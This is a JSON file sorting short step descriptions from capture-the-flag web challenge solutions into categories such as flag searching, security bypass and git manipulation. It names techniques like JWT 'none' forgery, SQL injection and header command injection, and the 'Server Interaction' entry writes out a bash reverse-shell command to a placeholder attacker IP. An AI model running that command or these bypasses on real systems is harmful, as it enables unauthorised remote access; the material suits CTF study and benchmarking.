{
    "Frontend Processing": [
        "Due to frontend processing, this resulted in the same verified message but carrying a different meaning."
    ],
    "URL Manipulation": [
        "Use the final URL.",
        "Detect if a scroll occurred when a text fragment is parsed in the URL.",
        "Include the cookie.php file"
    ],
    "Flag Searching": [
        "Search for the flag.",
        "Confirm the success message in the response.",
        "Identify the final flag from the assembled digits."
    ],
    "Test and Debug": [
        "Test the payloads from the unit test in the challenge.",
        "Checked the login page source code.",
        "Encounter difficulties determining the number of columns",
        "Take notice of the 'validateUrls' mechanism",
        "Viewed page source.",
        "Identify extra code for the debug mode in the file bookhub/views/user.py.",
        "Clarified that the 'shell_exec' function executes a command in a shell and returns the output.",
        "Extract the first flag from the decoded field.",
        "Utilized the `dirb` wordlist for username enumeration.",
        "Inspect webpage response.",
        "Notice that the webpage is a 'Markdown' converter.",
        "Review challenge",
        "Decided to use the `jsonp` method",
        "Include the cookie.php file",
        "Notice the inclusion of regex functionality."
    ],
    "Security Bypass": [
        "Bypassed duration check",
        "Bypassed the login process.",
        "Encode the JWT by setting the algorithm to 'none'",
        "Identified the prototype pollution vulnerability.",
        "Tried the previously discovered SQL injection, found that it still works",
        "Inject commands via 'User-Agent' HTTP header using curl command.",
        "Any characters allowed after the valid start of email"
    ],
    "Git Manipulation": [
        "Locate the '.git' directory via robots.",
        "Use the commit IDs to fetch further git objects from the server."
    ],
    "Server Interaction": [
        "Used 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command."
    ]
}